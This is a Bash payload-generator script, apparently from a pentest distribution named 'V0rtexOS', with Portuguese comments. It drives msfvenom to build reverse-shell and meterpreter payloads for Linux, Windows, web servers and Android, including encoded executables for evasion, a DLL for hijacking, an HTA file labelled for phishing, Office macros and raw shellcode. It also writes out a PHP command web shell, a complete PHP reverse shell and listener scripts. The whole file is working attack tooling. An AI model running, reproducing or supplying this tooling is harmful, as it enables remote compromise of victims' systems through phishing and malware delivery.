#!/usr/bin/env bash
# V0rtexOS — Gerador de Payloads com msfvenom
# Gera payloads para múltiplas plataformas com encode automático
# Uso: payload-gen.sh <lhost> <lport> [plataforma]

set -euo pipefail

LHOST="${1:?Informe LHOST}"
LPORT="${2:?Informe LPORT}"
PLATFORM="${3:-all}"
OUT_DIR="${4:-/tmp/aeternus-payloads/$(date +%Y%m%d-%H%M%S)}"

RED='\033[1;31m' GRN='\033[1;32m' CYN='\033[1;36m' YEL='\033[1;33m' RST='\033[0m'
ok()  { echo -e "${GRN}[+]${RST} $*"; }
log() { echo -e "${CYN}[*]${RST} $*"; }
err() { echo -e "${RED}[!]${RST} $*"; }

command -v msfvenom &>/dev/null || { err "msfvenom não encontrado. Instale o Metasploit."; exit 1; }

mkdir -p "$OUT_DIR"/{linux,windows,web,mobile,scripts}
log "Output: $OUT_DIR"
log "LHOST=$LHOST LPORT=$LPORT"

# ── LINUX ─────────────────────────────────────────
gen_linux() {
    log "Gerando payloads Linux..."

    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f elf -o "$OUT_DIR/linux/shell_rev_x64.elf" -q
    chmod +x "$OUT_DIR/linux/shell_rev_x64.elf"
    ok "linux/x64/shell_reverse_tcp → shell_rev_x64.elf"

    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f elf -o "$OUT_DIR/linux/meterpreter_x64.elf" -q
    ok "linux/x64/meterpreter_reverse_tcp → meterpreter_x64.elf"

    msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f elf -e x86/shikata_ga_nai -i 7 \
        -o "$OUT_DIR/linux/shell_rev_x86_encoded.elf" -q
    ok "linux/x86 encoded (7x shikata_ga_nai) → shell_rev_x86_encoded.elf"

    # Shellcode raw para injeção
    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f c -o "$OUT_DIR/linux/shellcode.c" -q
    ok "Shellcode C → shellcode.c"

    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f python -o "$OUT_DIR/linux/shellcode.py" -q
    ok "Shellcode Python → shellcode.py"
}

# ── WINDOWS ────────────────────────────────────────
gen_windows() {
    log "Gerando payloads Windows..."

    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f exe -o "$OUT_DIR/windows/shell_rev_x64.exe" -q
    ok "windows/x64/shell_reverse_tcp → shell_rev_x64.exe"

    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f exe -o "$OUT_DIR/windows/meterpreter_x64.exe" -q
    ok "windows/x64/meterpreter_reverse_tcp → meterpreter_x64.exe"

    # Payload com encoder para evasão básica
    msfvenom -p windows/x64/meterpreter_reverse_https LHOST="$LHOST" LPORT="$LPORT" \
        -e x64/xor_dynamic -i 5 \
        -f exe -o "$OUT_DIR/windows/meterpreter_https_encoded.exe" -q
    ok "windows/x64/meterpreter_reverse_https (encoded) → meterpreter_https_encoded.exe"

    # DLL para DLL hijacking
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f dll -o "$OUT_DIR/windows/payload.dll" -q
    ok "DLL payload → payload.dll"

    # HTA para phishing
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f hta-psh -o "$OUT_DIR/windows/payload.hta" -q
    ok "HTA payload → payload.hta"

    # PowerShell
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f psh -o "$OUT_DIR/windows/payload.ps1" -q
    ok "PowerShell payload → payload.ps1"

    # VBA macro para Word/Excel
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f vba -o "$OUT_DIR/windows/macro.vba" -q
    ok "VBA macro → macro.vba"

    # Shellcode raw (para injeção manual)
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f raw -o "$OUT_DIR/windows/shellcode.bin" -q
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f csharp -o "$OUT_DIR/windows/shellcode.cs" -q
    ok "Shellcode bin+C# → shellcode.bin / shellcode.cs"
}

# ── WEB ────────────────────────────────────────────
gen_web() {
    log "Gerando payloads Web..."

    msfvenom -p php/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f raw -o "$OUT_DIR/web/shell.php" -q
    ok "PHP meterpreter → shell.php"

    msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f raw -o "$OUT_DIR/web/shell.jsp" -q
    ok "JSP shell → shell.jsp"

    msfvenom -p java/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        -f war -o "$OUT_DIR/web/shell.war" -q
    ok "WAR payload → shell.war"

    # PHP web shells adicionais
    cat > "$OUT_DIR/web/cmd.php" <<'PHPSHELL'
<?php
// V0RTEX — Minimal PHP shell (sem msfvenom)
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
}
?>
PHPSHELL

    # PHP reverse shell (Pentestmonkey style)
    cat > "$OUT_DIR/web/rev.php" <<PHPREV
<?php
// V0RTEX — PHP Reverse Shell
\$ip   = '$LHOST';
\$port = $LPORT;
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; id; /bin/bash -i';
\$daemon = 0;
\$debug = 0;

if (function_exists('pcntl_fork')) {
    \$pid = pcntl_fork();
    if (\$pid == -1) die('Could not fork');
    if (\$pid) exit(0);
    if (posix_setsid() == -1) die("Error: " . posix_strerror(posix_get_last_error()));
    \$daemon = 1;
}

\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
if (!\$sock) die('Connect failed');
\$descriptorspec = [['pipe','r'],['pipe','w'],['pipe','w']];
\$process = proc_open(\$shell, \$descriptorspec, \$pipes);
if (!is_resource(\$process)) die('proc_open failed');
stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);
while(1){
    if(feof(\$sock)||feof(\$pipes[1])) break;
    \$read_a = [\$sock, \$pipes[1], \$pipes[2]];
    stream_select(\$read_a, \$write_a, \$error_a, null);
    if(in_array(\$sock,\$read_a)) { \$input=fread(\$sock,\$chunk_size); fwrite(\$pipes[0],\$input); }
    if(in_array(\$pipes[1],\$read_a)) { \$input=fread(\$pipes[1],\$chunk_size); fwrite(\$sock,\$input); }
    if(in_array(\$pipes[2],\$read_a)) { \$input=fread(\$pipes[2],\$chunk_size); fwrite(\$sock,\$input); }
}
fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]);
proc_close(\$process);
PHPREV
    ok "PHP reverse shell → rev.php"

    ok "Web payloads gerados."
}

# ── MOBILE / ANDROID ──────────────────────────────
gen_mobile() {
    log "Gerando payloads Mobile..."

    msfvenom -p android/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
        R -o "$OUT_DIR/mobile/payload.apk" -q
    ok "Android meterpreter → payload.apk"
}

# ── SCRIPTS DE LISTENER ───────────────────────────
gen_listeners() {
    log "Gerando scripts de listener..."

    cat > "$OUT_DIR/scripts/handler.rc" <<RC
# msfconsole -r handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -j -z
RC
    ok "MSF handler script → handler.rc"

    cat > "$OUT_DIR/scripts/start_handler.sh" <<SH
#!/usr/bin/env bash
msfconsole -q -r "$(dirname "\$0")/handler.rc"
SH
    chmod 755 "$OUT_DIR/scripts/start_handler.sh"

    # netcat listener
    cat > "$OUT_DIR/scripts/nc_listener.sh" <<NCL
#!/usr/bin/env bash
echo "[*] Listening on $LPORT (netcat)..."
ncat -lvnp $LPORT
NCL
    chmod 755 "$OUT_DIR/scripts/nc_listener.sh"

    # pwncat listener
    cat > "$OUT_DIR/scripts/pwncat_listener.sh" <<PCL
#!/usr/bin/env bash
echo "[*] Listening on $LPORT (pwncat-cs)..."
pwncat-cs -lp $LPORT
PCL
    chmod 755 "$OUT_DIR/scripts/pwncat_listener.sh"

    ok "Listeners gerados."
}

# ── SUMÁRIO ────────────────────────────────────────
print_summary() {
    echo
    echo -e "${CYN}═══════════════════════════════════════════════${RST}"
    echo -e "${CYN}  V0RTEX — Payloads Gerados${RST}"
    echo -e "${CYN}  LHOST: $LHOST | LPORT: $LPORT${RST}"
    echo -e "${CYN}═══════════════════════════════════════════════${RST}"
    find "$OUT_DIR" -type f | sort | while read -r f; do
        size=$(du -sh "$f" 2>/dev/null | cut -f1)
        echo -e "  ${GRN}${size}${RST}\t${f##"$OUT_DIR/"}"
    done
    echo -e "${CYN}═══════════════════════════════════════════════${RST}"
    echo
    echo -e "${YEL}[*] Iniciar listener:${RST}"
    echo -e "    msfconsole -q -r $OUT_DIR/scripts/handler.rc"
    echo -e "    pwncat-cs -lp $LPORT"
    echo
}

main() {
    echo -e "\n${CYN}╔═══════════════════════════════════════════╗"
    echo    "║  V0rtexOS — Gerador de Payloads       ║"
    echo -e "╚═══════════════════════════════════════════╝${RST}\n"

    case "$PLATFORM" in
        linux)   gen_linux ;;
        windows) gen_windows ;;
        web)     gen_web ;;
        mobile)  gen_mobile ;;
        all)
            gen_linux
            gen_windows
            gen_web
            gen_mobile
            gen_listeners
            ;;
        *)
            err "Plataforma desconhecida: $PLATFORM"
            echo "Plataformas: linux windows web mobile all"
            exit 1
            ;;
    esac

    gen_listeners
    print_summary
}

main "$@"
